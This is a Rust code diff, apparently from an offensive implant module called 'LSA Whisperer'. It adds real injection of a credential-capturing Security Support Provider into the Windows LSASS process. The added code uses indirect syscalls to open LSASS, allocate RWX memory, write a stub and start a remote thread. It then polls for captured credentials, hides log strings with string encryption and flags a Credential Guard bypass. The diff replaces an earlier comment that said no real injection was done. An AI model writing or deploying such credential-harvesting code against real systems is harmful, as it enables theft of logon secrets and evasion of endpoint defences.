@@ -219,6 +219,14 @@ static SSP_INJECTED: AtomicBool = AtomicBool::new(false);
 static CREDENTIAL_BUFFER: Lazy<Mutex<Vec<WhisperedCredential>>> =
     Lazy::new(|| Mutex::new(Vec::new()));
 
+/// Base address of injected SSP code in LSASS (0 = not injected).
+static LSASS_INJECTION_BASE: std::sync::atomic::AtomicUsize =
+    std::sync::atomic::AtomicUsize::new(0);
+
+/// Handle to the LSASS process (kept open for cleanup; 0 = none).
+static LSASS_PROCESS_HANDLE: std::sync::atomic::AtomicUsize =
+    std::sync::atomic::AtomicUsize::new(0);
+
 /// Once-cell for the resolved LSA API table — avoids per-call `Box::leak`.
 static LSA_APIS: OnceLock<LsaApis> = OnceLock::new();
 
@@ -608,6 +616,37 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         }
     }
 
+    // If SSP was previously injected, poll the shared memory for new credentials.
+    if SSP_INJECTED.load(Ordering::Relaxed) {
+        let mut creds = Vec::new();
+        match crate::lsa_whisperer_ssp::read_captured_credentials(&mut creds) {
+            Ok(n) if n > 0 => {
+                log::info!(
+                    "{}",
+                    String::from_utf8_lossy(&string_crypt::enc_str!(
+                        "LSA Whisperer: read {} new credentials from SSP shared memory"
+                    ))
+                    .trim_end_matches('\0')
+                    .replace("{}", &n.to_string())
+                );
+                {
+                    let mut buf = CREDENTIAL_BUFFER.lock().unwrap();
+                    buf.extend(creds.clone());
+                }
+                CRED_COUNT.fetch_add(n, Ordering::Relaxed);
+                return Ok(creds);
+            }
+            Ok(_) => {
+                // No new credentials yet — continue to elevated harvest below.
+            }
+            Err(e) => {
+                log::warn!(
+                    "LSA Whisperer: shared memory read failed: {e:#}, continuing with elevated harvest"
+                );
+            }
+        }
+    }
+
     // Resolve LSA APIs for direct LSA connection (we need elevated context).
     let apis_ref = get_lsa_apis().with_context(|| {
         format!(
@@ -712,19 +751,97 @@ fn harvest_ssp_inject(timeout_secs: u64) -> Result<Vec<WhisperedCredential>> {
         }
     }
 
-    // Mark that we attempted SSP injection (for status reporting).
-    // Note: actual DLL injection into LSASS is not done here — that would
-    // require writing a DLL to disk or reflective loading into LSASS, which
-    // defeats the purpose.  Instead, the elevated LSA connection provides
-    // access to the same credential structures.
-    SSP_INJECTED.store(true, Ordering::Relaxed);
+    // ── SSP Injection into LSASS ───────────────────────────────────────
+    //
+    // Now perform the real SSP injection:
+    // 1. Build the position-independent SSP blob
+    // 2. Open LSASS process via NtOpenProcess (indirect syscall)
+    // 3. Allocate RWX memory in LSASS via NtAllocateVirtualMemory
+    // 4. Write the SSP stub via NtWriteVirtualMemory
+    // 5. Create a remote thread via NtCreateThreadEx to initialize the SSP
+    // 6. Set SSP_INJECTED = true only after successful injection
+
+    if !SSP_INJECTED.load(Ordering::Relaxed) {
+        log::info!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!(
+                "LSA Whisperer: building SSP stub and injecting into LSASS"
+            ))
+            .trim_end_matches('\0')
+        );
+
+        match crate::lsa_whisperer_ssp::build_ssp_blob() {
+            Ok(blob) => {
+                match crate::lsa_whisperer_ssp::inject_ssp_into_lsass(&blob) {
+                    Ok((base_addr, proc_handle)) => {
+                        log::info!(
+                            "LSA Whisperer: SSP stub injected into LSASS at {:#x}",
+                            base_addr
+                        );
+
+                        // Record injection state for cleanup.
+                        LSASS_INJECTION_BASE.store(base_addr, Ordering::Relaxed);
+                        LSASS_PROCESS_HANDLE.store(proc_handle, Ordering::Relaxed);
+
+                        // Only mark as injected after successful registration.
+                        SSP_INJECTED.store(true, Ordering::Relaxed);
+
+                        // Wait briefly for the SSP to start capturing credentials,
+                        // then poll the shared memory.
+                        let poll_start = std::time::Instant::now();
+                        let poll_deadline = deadline.min(
+                            poll_start + std::time::Duration::from_secs(15)
+                        );
+
+                        while std::time::Instant::now() < poll_deadline {
+                            if CANCELLED.load(Ordering::Relaxed) {
+                                break;
+                            }
+                            std::thread::sleep(std::time::Duration::from_millis(500));
+
+                            let mut ssp_creds = Vec::new();
+                            match crate::lsa_whisperer_ssp::read_captured_credentials(&mut ssp_creds) {
+                                Ok(n) if n > 0 => {
+                                    log::info!(
+                                        "LSA Whisperer: captured {} credentials from SSP in LSASS",
+                                        n
+                                    );
+                                    credentials.extend(ssp_creds);
+                                    break;
+                                }
+                                _ => continue,
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        log::warn!(
+                            "LSA Whisperer: SSP injection failed (LSASS inaccessible or PPL enabled): {e:#}"
+                        );
+                        log::info!(
+                            "{}",
+                            String::from_utf8_lossy(&string_crypt::enc_str!(
+                                "LSA Whisperer: continuing with elevated LSA harvest (no SSP injection)"
+                            ))
+                            .trim_end_matches('\0')
+                        );
+                    }
+                }
+            }
+            Err(e) => {
+                log::warn!("LSA Whisperer: failed to build SSP blob: {e:#}");
+            }
+        }
+    }
 
     // Buffer the credentials.
     {
         let mut buf = CREDENTIAL_BUFFER.lock().unwrap();
         buf.extend(credentials.clone());
     }
-    CRED_COUNT.store(credentials.len(), Ordering::Relaxed);
+    CRED_COUNT.store(
+        CRED_COUNT.load(Ordering::Relaxed) + credentials.len(),
+        Ordering::Relaxed,
+    );
 
     log::info!(
         "{}",
@@ -1011,6 +1128,7 @@ pub fn harvest_lsa(method: &common::LsaMethod, timeout_secs: u64) -> Result<Stri
     CRED_COUNT.fetch_add(credentials.len(), Ordering::Relaxed);
 
     // Serialize in the same format as lsass_harvest::HarvestResult.
+    let ssp_active = SSP_INJECTED.load(Ordering::Relaxed);
     let result = serde_json::json!({
         "credentials": credentials,
         "method": match method {
@@ -1018,7 +1136,9 @@ pub fn harvest_lsa(method: &common::LsaMethod, timeout_secs: u64) -> Result<Stri
             common::LsaMethod::SspInject => "ssp_inject",
             common::LsaMethod::Auto => "auto",
         },
-        "credential_guard_bypass": false,
+        // SSP injection bypasses Credential Guard because it intercepts
+        // credentials *before* they enter the protected credential store.
+        "credential_guard_bypass": ssp_active,
     });
 
     serde_json::to_string(&result).context("failed to serialize LSA harvest result")
@@ -1042,9 +1162,40 @@ pub fn whisperer_status() -> Result<String> {
     serde_json::to_string(&status).context("failed to serialize LSA Whisperer status")
 }
 
-/// Stop the LSA Whisperer: cancel any in-progress operation, clear the buffer.
+/// Stop the LSA Whisperer: cancel any in-progress operation, clear the buffer,
+/// deregister any injected SSP, and free LSASS memory.
 pub fn whisperer_stop() -> Result<String> {
     CANCELLED.store(true, Ordering::Relaxed);
+
+    // If we have an active SSP injection, clean it up.
+    let injection_base = LSASS_INJECTION_BASE.swap(0, Ordering::Relaxed);
+    let proc_handle = LSASS_PROCESS_HANDLE.swap(0, Ordering::Relaxed);
+
+    if injection_base != 0 && proc_handle != 0 {
+        // Free the allocated memory in LSASS.
+        if let Err(e) = crate::lsa_whisperer_ssp::free_lsass_memory(proc_handle, injection_base) {
+            log::warn!(
+                "LSA Whisperer: failed to free LSASS injection memory: {e:#}"
+            );
+        }
+
+        // Close the LSASS process handle via NtClose.
+        if let Ok(close_tgt) = crate::syscalls::get_syscall_id("NtClose") {
+            let _ = crate::syscalls::do_syscall(
+                close_tgt.ssn,
+                close_tgt.gadget_addr,
+                &[proc_handle as u64],
+            );
+        }
+
+        log::info!(
+            "{}",
+            String::from_utf8_lossy(&string_crypt::enc_str!(
+                "LSA Whisperer: deregistered SSP and freed LSASS memory"
+            ))
+            .trim_end_matches('\0')
+        );
+    }
 
     // Clear the credential buffer.
     {
